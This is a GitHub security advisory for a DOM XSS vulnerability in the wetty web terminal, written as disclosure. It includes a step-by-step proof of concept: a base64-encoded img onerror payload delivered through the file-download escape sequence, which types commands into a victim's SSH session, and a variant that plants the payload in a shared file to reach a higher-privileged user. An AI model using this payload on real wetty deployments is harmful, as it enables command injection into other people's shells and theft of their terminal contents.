# [H] wetty vulnerable to DOM XSS via file-download filename

## Summary
Severity: High
Advisory: GHSA-p26j-h7wj-r568
CVE: CVE-2026-49864
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-p26j-h7wj-r568
Type: github-advisory

## Affected
- npm: `wetty` — affected >=0 <3.0.4

## Details
### Summary

The wetty client decodes a base64 filename from the file-download escape sequence and interpolates it raw into a Toastify HTML string (`escapeMarkup: false`). Any output the victim renders - a `cat`'d file, a tailed log, an SSH MOTD, a `curl` response - that contains `\x1b[5i...:...\x1b[4i` runs script in the wetty origin and types attacker-chosen keystrokes into the victim's SSH session.

### Preconditions

- Victim has wetty open with an active SSH session.
- Attacker delivers the file-download escape sequence (`\x1b[5i<b64-name>:<b64-content>\x1b[4i`) into output the victim's terminal renders.
- Default configuration; no non-default flags required.

### Details

```typescript
// src/client/wetty.ts:37, 46-62
const fileDownloader = new FileDownloader();
// ...
socket.on('data', (data: string) => {
  const remainingData = fileDownloader.buffer(data);
  // every PTY byte forwarded by the server passes through buffer()
  // ...
})
```

Every byte the server forwards from the PTY passes through `FileDownloader.buffer`. The buffer scans for the documented file-download markers `\x1b[5i` (begin) and `\x1b[4i` (end) - documented in `docs/downloading-files.md` - and, on a complete match, hands the inner payload to `onCompleteFile`.

```typescript
// src/client/wetty/download.ts:9-77
function onCompleteFile(bufferCharacters: string): void {
  let fileNameBase64;
  let fileCharacters = bufferCharacters;
  if (bufferCharacters.includes(':')) {
    [fileNameBase64, fileCharacters] = bufferCharacters.split(':');
  }
  // ...
  void detectAndDownload(bytes, fileCharacters, fileNameBase64);
}

async function detectAndDownload(/* ... */): Promise<void> {
  // ...
  let fileName;
  try {
    if (fileNameBase64 !== undefined) {
      fileName = window.atob(fileNameBase64);            // attacker-controlled
    }
  } catch { /* ... */ }
  fileName ??= `file-${ /* timestamp default */ }`;
  // ...
  Toastify({
    text: `Download ready: <a href="${blobUrl}" target="_blank" `
        + `download="${fileName}">${fileName}</a>`,     // sink
    duration: 10000,
    // ...
    escapeMarkup: false,
  }).showToast();
}
```

`fileName` is base64-decoded from the escape-sequence payload, then interpolated twice into a string that Toastify renders as raw HTML (`escapeMarkup: false`). No HTML escaping runs between `atob` and the toast markup. The wetty client exposes the live terminal as `window.wetty_term`, and `term.input(data, true)` (`src/client/wetty/term.ts:80, 93-97, 132, 145-198`) fires xterm.js's `onData`, which `src/client/wetty.ts:40-42` forwards as a socket `input` event - i.e., script in the wetty origin types into the victim's SSH session.

### Proof of concept

**Setup**

1. Bring up wetty and its bundled SSH host from a fresh clone:

   ```bash
   git clone https://github.com/butlerx/wetty
   cd wetty
   docker compose up -d
   sleep 5
   ```

2. Open `http://localhost/wetty` in a browser. The login terminal prompts for a username (enter `term`) then proxies to `wetty-ssh`, which prompts for the SSH password (also `term`, set in `containers/ssh/Dockerfile`). The browser tab now holds a shell on the SSH container.

**Exploit**

1. In the SSH session, build and emit the escape sequence. The filename portion carries the HTML payload; the content portion is a short literal so the toast renders quickly:

   ```bash
   PAYLOAD='"><img src=x onerror="window.wetty_term.input(\"id > /tmp/pwned\\n\",true)">'
   FNAME_B64=$(printf '%s' "$PAYLOAD" | base64 -w0)
   DATA_B64=$(printf 'bait' | base64 -w0)
   printf '\x1b[5i%s:%s\x1b[4i' "$FNAME_B64" "$DATA_B64"
   ```

   Expected: a Toastify notification appears at the bottom-right of the wetty page. Its DOM contains the attacker-supplied `<img>` element with the `onerror` handler.

2. The `onerror` handler calls `window.wetty_term.input("id > /tmp/pwned\n", true)`, which xterm.js dispatches as a `data` event; `src/client/wetty.ts:40-42` forwards it as a socket `input` event; the server writes it to the PTY. The SSH host runs `id > /tmp/pwned` as the connected user:

   ```bash
   cat /tmp/pwned
   ```

   Expected: `uid=1000(term) gid=1000(term) groups=1000(term)`.

3. The same chain works cross-user. On a shared SSH host, a low-privileged user plants the sequence in a file the higher-privileged user reads via wetty:

   ```bash
   # As the low-priv user on the SSH host
   printf '\x1b[5i%s:%s\x1b[4i' "$FNAME_B64" "$DATA_B64" > /tmp/notes.txt
   ```

   When the higher-privileged user's wetty session runs `cat /tmp/notes.txt`, attacker-controlled JavaScript types commands into that user's shell.

### Impact

- **Confidentiality:** Reads the rendered terminal contents via `window.wetty_term.buffer.active`.
- **Integrity:** Types attacker-chosen commands into the victim's SSH session via `window.wetty_term.input()`.
- **Auth:** A writer of content the victim renders gains keystroke injection in the victim's higher-privileged session - a path from any local SSH user to commands as the wetty user.

### Suggestions to fix

> _This has not been tested - it is illustrative only._

HTML-escape the decoded filename before interpolating it into Toastify's HTML markup at `src/client/wetty/download.ts:67-77`.

```diff
   fileName ??= `file-${new Date()
     .toISOString()
     .split('.')[0]
     .replace(/-/g, '')
     .replace('T', '')
     .replace(/:/g, '')}${fileExt ? `.${fileExt}` : ''}`;
+  const safeName = fileName.replace(/[&<>"']/g, (c) =>
+    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c] ?? c,
+  );

   const blob = new Blob([bytes.buffer as ArrayBuffer], { type: mimeType });
   const blobUrl = URL.createObjectURL(blob);

   Toastify({
-    text: `Download ready: <a href="${blobUrl}" target="_blank" download="${fileName}">${fileName}</a>`,
+    text: `Download ready: <a href="${blobUrl}" target="_blank" download="${safeName}">${safeName}</a>`,
     duration: 10000,
```

## References
- https://github.com/butlerx/wetty/security/advisories/GHSA-p26j-h7wj-r568
- https://github.com/butlerx/wetty
